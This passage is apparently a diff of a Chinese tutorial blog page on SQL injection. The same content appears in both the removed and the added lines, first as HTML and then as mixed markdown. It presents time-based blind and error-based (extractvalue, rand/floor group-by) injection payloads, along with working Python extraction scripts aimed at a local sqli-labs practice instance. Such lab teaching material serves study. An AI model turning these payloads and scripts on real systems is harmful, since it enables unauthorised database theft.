+进行测试，如果页面执行有延迟，说明存在漏洞。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">5</span>)#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div> <img 
 
-<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>盲注就是在 SQL 注入过程中，SQL 语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
-<h2 id="判断是否存在注入-1"><a href="#判断是否存在注入-1" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>由于没有任何的回显内容，所以无法通过正常的方法判断是否存在注入，可以使用 <code>1 and sleep(5)#</code> 或者 <code>1&#39; and sleep(5)#</code> 进行测试，如果页面执行有延迟，说明存在漏洞。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">5</span>)#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div>
-<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/1bde5ee9419868283a667851852434fa.png"
-                      alt="在这里插入图片描述"
-                ></p>
-<h2 id="判断超时"><a href="#判断超时" class="headerlink" title="判断超时"></a>判断超时</h2><p>时间盲注是以请求时间为判断依据的，这里通过线程执行时间来判断是否超时。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_timeout</span>(<span class="params">func, args=(<span class="params"></span>), kwargs=&#123;&#125;, timeout_duration=<span class="number">2</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">target</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    thread = threading.Thread(target=target, args=args, kwargs=kwargs)</span><br><span class="line">    thread.start()</span><br><span class="line">    thread.join(timeout_duration)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 返回 None 表示超时</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="泄露数字-1"><a href="#泄露数字-1" class="headerlink" title="泄露数字"></a>泄露数字</h2><p>因为如果请求超时则判断时间较长，因此这里不采用二分进行优化。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-9/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">query_num</span>):</span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> check_timeout(requests.get,</span><br><span class="line">                         kwargs=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; and if((<span class="subst">&#123;query_num&#125;</span>)&lt;=<span class="subst">&#123;value&#125;</span>, sleep(3), 1)%23&quot;</span>&#125;,</span><br><span class="line">                         ) == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        value += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="泄露字符串-1"><a href="#泄露字符串-1" class="headerlink" title="泄露字符串"></a>泄露字符串</h2><p>实现完 <code>get_value</code> 原语之后，泄露字符串的方法与布尔盲注基本一致。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">query_string</span>):</span><br><span class="line">    string_len = get_value(<span class="string">f&quot;length((<span class="subst">&#123;query_string&#125;</span>))&quot;</span>)</span><br><span class="line">    res_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(string_len):</span><br><span class="line">        res_string += <span class="built_in">chr</span>(get_value(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;query_string&#125;</span>),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(res_string)</span><br><span class="line">    <span class="keyword">return</span> res_string</span><br></pre></td></tr></table></figure></div>
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>SQL 报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息（比如 <code>mysql_error()</code> 函数的报错信息）的情况下比较好用。</p>
-<h2 id="xpath-语法错误"><a href="#xpath-语法错误" class="headerlink" title="xpath 语法错误"></a>xpath 语法错误</h2><h3 id="相关函数-2"><a href="#相关函数-2" class="headerlink" title="相关函数"></a>相关函数</h3><p>MySQL 5.1.5 开始提供了两个 XML 查询和修改的函数：</p>
-<ul>
-<li><code>updatexml(xml_target, xpath_expr, new_value)</code>：<ul>
-<li><strong>功能</strong>：更新 XML 文档中指定节点的值。</li>
-<li><strong>参数</strong>：<ul>
-<li><code>xml_target</code>：要修改的 XML 文档。</li>
-<li><code>xpath_expr</code>：用于定位要修改的节点的 XPath 表达式。</li>
-<li><code>new_value</code>：新的节点值。</li>
-</ul>
-</li>
-<li><strong>返回值</strong>：如果成功修改，返回修改后的 XML 文档；否则返回原始 XML 文档。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@xml</span> <span class="operator">=</span> <span class="string">&#x27;&lt;book&gt;</span></span><br><span class="line"><span class="string">              &lt;title&gt;MySQL Book&lt;/title&gt;</span></span><br><span class="line"><span class="string">              &lt;author&gt;John Doe&lt;/author&gt;</span></span><br><span class="line"><span class="string">            &lt;/book&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> updatexml(<span class="variable">@xml</span>, <span class="string">&#x27;/book/title&#x27;</span>, <span class="string">&#x27;New Book Title&#x27;</span>);</span><br><span class="line"><span class="comment">-- 输出: &lt;book&gt;</span></span><br><span class="line"><span class="comment">--        &lt;title&gt;New Book Title&lt;/title&gt;</span></span><br><span class="line"><span class="comment">--        &lt;author&gt;John Doe&lt;/author&gt;</span></span><br><span class="line"><span class="comment">--      &lt;/book&gt;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>extractvalue(xml_frag, xpath_expr)</code>：<ul>
-<li><strong>功能</strong>：从 XML 文档中提取指定节点的值。</li>
-<li><strong>参数</strong>：<ul>
-<li><code>xml_frag</code>：包含 XML 数据的字符串。</li>
-<li><code>xpath_expr</code>：用于定位要提取的节点的 XPath 表达式。</li>
-</ul>
-</li>
-<li><strong>返回值</strong>：返回 XPath 表达式所指定的节点的值。如果未找到节点，则返回 NULL 。</li>
-<li><strong>示例</strong>：<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@xml</span> <span class="operator">=</span> <span class="string">&#x27;&lt;book&gt;</span></span><br><span class="line"><span class="string">              &lt;title&gt;MySQL Book&lt;/title&gt;</span></span><br><span class="line"><span class="string">              &lt;author&gt;John Doe&lt;/author&gt;</span></span><br><span class="line"><span class="string">            &lt;/book&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> extractvalue(<span class="variable">@xml</span>, <span class="string">&#x27;/book/title&#x27;</span>);</span><br><span class="line"><span class="comment">-- 输出: MySQL Book</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-</ul>
-<h3 id="泄露原语-1"><a href="#泄露原语-1" class="headerlink" title="泄露原语"></a>泄露原语</h3><p>因为我们只关注 xpath 参数，因此 <code>updatexml</code> 和 <code>extractvalue</code> 函数在漏洞利用上等价，这里只演示 <code>extractvalue</code> 函数的报错注入。</p>
-<ul>
-<li>xpath 只会对特殊字符进行报错，这里我们可以用 0x7e(<code>~</code>) 来触发报错。</li>
-<li>xpath 只会报错 32 个字符，对于输出结果大于 32 个字符的命令，要用 <code>substr</code> 函数截取后分段输出。<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-5/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    offset = <span class="number">1</span></span><br><span class="line">    res_data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1&#x27; and extractvalue(1,concat(0x7e,substr((<span class="subst">&#123;query_data&#125;</span>),<span class="subst">&#123;offset&#125;</span>,30),0x7e))%23&quot;</span>).text</span><br><span class="line">        part_data = re.search(<span class="string">r&#x27;XPATH syntax error: \&#x27;~([^&lt;\s]+)~&#x27;</span>, html_content)</span><br><span class="line">        <span class="keyword">if</span> part_data == <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">        part_data = part_data.group(<span class="number">1</span>)</span><br><span class="line">        res_data += part_data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(part_data) &lt; <span class="number">30</span>: <span class="keyword">break</span></span><br><span class="line">        offset += <span class="built_in">len</span>(part_data)</span><br><span class="line">    <span class="keyword">return</span> res_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_data(<span class="string">&quot;select database()&quot;</span>))</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="虚拟表报错注入"><a href="#虚拟表报错注入" class="headerlink" title="虚拟表报错注入"></a>虚拟表报错注入</h2><h3 id="相关函数-3"><a href="#相关函数-3" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
-<li><code>rand([seed])</code>：<ul>
-<li><strong>功能</strong>：生成一个 0 到 1 之间的随机浮点数。</li>
-<li><strong>参数</strong>：<code>seed</code> 是可选参数，用于指定随机数生成器的种子值。如果不指定种子值，<code>rand()</code> 函数将生成一个随机的种子值。</li>
-<li><strong>示例</strong>:  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> rand(); <span class="comment">-- 输出: 0.7580294616547366</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-<li><code>floor(x)</code>：<ul>
-<li><strong>功能</strong>：返回小于或等于指定数字的最大整数。</li>
-<li><strong>语法</strong>：<code>floor(x)</code></li>
-<li><strong>参数</strong>：<code>x</code> 是要向下取整的数字,可以是整数或浮点数。</li>
-<li><strong>示例</strong>:<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">floor</span>(<span class="number">3.14</span>); <span class="comment">-- 输出: 3</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">floor</span>(<span class="number">-3.14</span>); <span class="comment">-- 输出: -4</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-</ul>
-<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>在一个字段中如果 <code>rand</code> 函数多次使用并且提供种子值则产生的随机数序列是确定的。比如下面这个 SQL 语句：</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">12323</span>) <span class="operator">*</span> <span class="number">2</span>) <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">from</span> information_schema.tables;</span><br></pre></td></tr></table></figure></div>
-<p>在我的环境下该语句产生的序列如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, ...</span><br></pre></td></tr></table></figure></div>
-
-<p>然后我们有一张拥有 13 条数据的表 <code>users</code> 。我们执行如下 SQL 语句：</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">12323</span>) <span class="operator">*</span> <span class="number">2</span>) <span class="keyword">as</span> a, <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure></div>
-
-<p>在执行 <code>group by</code> 语句的过程中维护了一个「虚拟表」（实际上也就是结果表），具体进行如下步骤：</p>
-<ul>
-<li>对于 <code>users</code> 表的每一行，执行 <code>floor(rand(12323) * 2)</code> 获得一个唯一键 <code>a</code>（这里用唯一约束，因此称之为唯一键）。<ul>
-<li>如果 <code>a</code> 在虚拟表中存在则将对应的 <code>count(*)</code> 项加 1 。</li>
-<li>如果 <code>a</code> 在虚拟表中不存在则 <strong>再次执行</strong>  <code>floor(rand(12323) * 2)</code>  获得一个唯一键 <code>b</code> 然后将 <code>b</code> 插入到虚拟表中并且对应 <code>count(*)</code> 项设为 1 。</li>
-</ul>
-</li>
-</ul>
-<p>根据这一特性我们可以得出结论：<code>floor(rand(12323) * 2)</code> 第一次产生的值不会统计进去而是将下一个产生的值统计进去，然后总共统计表的数据条数个数。因此执行结果如下：<br><img  
+                     data-src="images/1bde5ee9419868283a667851852434fa.png"
+                     
+alt="在这里插入图片描述" 
+                > ## 判断超时
+时间盲注是以请求时间为判断依据的，这里通过线程执行时间来判断是否超时。
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_timeout</span>(<span class="params">func, args=(<span class="params"></span>), kwargs=&#123;&#125;, timeout_duration=<span class="number">2</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">target</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    thread = threading.Thread(target=target, args=args, kwargs=kwargs)</span><br><span class="line">    thread.start()</span><br><span class="line">    thread.join(timeout_duration)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 返回 None 表示超时</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></div> ## 泄露数字
+因为如果请求超时则判断时间较长，因此这里不采用二分进行优化。
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-9/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">query_num</span>):</span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> check_timeout(requests.get,</span><br><span class="line">                         kwargs=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; and if((<span class="subst">&#123;query_num&#125;</span>)&lt;=<span class="subst">&#123;value&#125;</span>, sleep(3), 1)%23&quot;</span>&#125;,</span><br><span class="line">                         ) == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        value += <span class="number">1</span></span><br></pre></td></tr></table></figure></div> ## 泄露字符串 实现完 <code>get_value</code>
+原语之后，泄露字符串的方法与布尔盲注基本一致。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">query_string</span>):</span><br><span class="line">    string_len = get_value(<span class="string">f&quot;length((<span class="subst">&#123;query_string&#125;</span>))&quot;</span>)</span><br><span class="line">    res_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(string_len):</span><br><span class="line">        res_string += <span class="built_in">chr</span>(get_value(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;query_string&#125;</span>),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(res_string)</span><br><span class="line">    <span class="keyword">return</span> res_string</span><br></pre></td></tr></table></figure></div> # 报错注入
+SQL
+报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息（比如
+<code>mysql_error()</code> 函数的报错信息）的情况下比较好用。 ## xpath
+语法错误 ### 相关函数 MySQL 5.1.5 开始提供了两个 XML 查询和修改的函数：
+- <code>updatexml(xml_target, xpath_expr, new_value)</code>： -
+<strong>功能</strong>：更新 XML 文档中指定节点的值。 -
+<strong>参数</strong>： - <code>xml_target</code>：要修改的 XML 文档。 -
+<code>xpath_expr</code>：用于定位要修改的节点的 XPath 表达式。 -
+<code>new_value</code>：新的节点值。 -
+<strong>返回值</strong>：如果成功修改，返回修改后的 XML
+文档；否则返回原始 XML 文档。 - <strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@xml</span> <span class="operator">=</span> <span class="string">&#x27;&lt;book&gt;</span></span><br><span class="line"><span class="string">              &lt;title&gt;MySQL Book&lt;/title&gt;</span></span><br><span class="line"><span class="string">              &lt;author&gt;John Doe&lt;/author&gt;</span></span><br><span class="line"><span class="string">            &lt;/book&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> updatexml(<span class="variable">@xml</span>, <span class="string">&#x27;/book/title&#x27;</span>, <span class="string">&#x27;New Book Title&#x27;</span>);</span><br><span class="line"><span class="comment">-- 输出: &lt;book&gt;</span></span><br><span class="line"><span class="comment">--        &lt;title&gt;New Book Title&lt;/title&gt;</span></span><br><span class="line"><span class="comment">--        &lt;author&gt;John Doe&lt;/author&gt;</span></span><br><span class="line"><span class="comment">--      &lt;/book&gt;</span></span><br></pre></td></tr></table></figure></div> -
+<code>extractvalue(xml_frag, xpath_expr)</code>： -
+<strong>功能</strong>：从 XML 文档中提取指定节点的值。 -
+<strong>参数</strong>： - <code>xml_frag</code>：包含 XML 数据的字符串。
+- <code>xpath_expr</code>：用于定位要提取的节点的 XPath 表达式。 -
+<strong>返回值</strong>：返回 XPath
+表达式所指定的节点的值。如果未找到节点，则返回 NULL 。 -
+<strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@xml</span> <span class="operator">=</span> <span class="string">&#x27;&lt;book&gt;</span></span><br><span class="line"><span class="string">              &lt;title&gt;MySQL Book&lt;/title&gt;</span></span><br><span class="line"><span class="string">              &lt;author&gt;John Doe&lt;/author&gt;</span></span><br><span class="line"><span class="string">            &lt;/book&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> extractvalue(<span class="variable">@xml</span>, <span class="string">&#x27;/book/title&#x27;</span>);</span><br><span class="line"><span class="comment">-- 输出: MySQL Book</span></span><br></pre></td></tr></table></figure></div> ### 泄露原语 因为我们只关注 xpath
+参数，因此 <code>updatexml</code> 和 <code>extractvalue</code>
+函数在漏洞利用上等价，这里只演示 <code>extractvalue</code>
+函数的报错注入。 - xpath 只会对特殊字符进行报错，这里我们可以用
+0x7e(<code>~</code>) 来触发报错。 - xpath 只会报错 32
+个字符，对于输出结果大于 32 个字符的命令，要用 <code>substr</code>
+函数截取后分段输出。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-5/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    offset = <span class="number">1</span></span><br><span class="line">    res_data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1&#x27; and extractvalue(1,concat(0x7e,substr((<span class="subst">&#123;query_data&#125;</span>),<span class="subst">&#123;offset&#125;</span>,30),0x7e))%23&quot;</span>).text</span><br><span class="line">        part_data = re.search(<span class="string">r&#x27;XPATH syntax error: \&#x27;~([^&lt;\s]+)~&#x27;</span>, html_content)</span><br><span class="line">        <span class="keyword">if</span> part_data == <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">        part_data = part_data.group(<span class="number">1</span>)</span><br><span class="line">        res_data += part_data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(part_data) &lt; <span class="number">30</span>: <span class="keyword">break</span></span><br><span class="line">        offset += <span class="built_in">len</span>(part_data)</span><br><span class="line">    <span class="keyword">return</span> res_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_data(<span class="string">&quot;select database()&quot;</span>))</span><br></pre></td></tr></table></figure></div> ## 虚拟表报错注入 ### 相关函数 -
+<code>rand([seed])</code>： - <strong>功能</strong>：生成一个 0 到 1
+之间的随机浮点数。 - <strong>参数</strong>：<code>seed</code>
+是可选参数，用于指定随机数生成器的种子值。如果不指定种子值，<code>rand()</code>
+函数将生成一个随机的种子值。 - <strong>示例</strong>: <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> rand(); <span class="comment">-- 输出: 0.7580294616547366</span></span><br></pre></td></tr></table></figure></div> -
+<code>floor(x)</code>： -
+<strong>功能</strong>：返回小于或等于指定数字的最大整数。 -
+<strong>语法</strong>：<code>floor(x)</code> -
+<strong>参数</strong>：<code>x</code>
+是要向下取整的数字,可以是整数或浮点数。 - <strong>示例</strong>:
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">floor</span>(<span class="number">3.14</span>); <span class="comment">-- 输出: 3</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">floor</span>(<span class="number">-3.14</span>); <span class="comment">-- 输出: -4</span></span><br></pre></td></tr></table></figure></div> ### 基本原理 在一个字段中如果 <code>rand</code>
+函数多次使用并且提供种子值则产生的随机数序列是确定的。比如下面这个 SQL
+语句： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">12323</span>) <span class="operator">*</span> <span class="number">2</span>) <span class="keyword">as</span> a</span><br><span class="line"><span class="keyword">from</span> information_schema.tables;</span><br></pre></td></tr></table></figure></div> 在我的环境下该语句产生的序列如下：
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, ...</span><br></pre></td></tr></table></figure></div></p>
+<p>然后我们有一张拥有 13 条数据的表 <code>users</code> 。我们执行如下
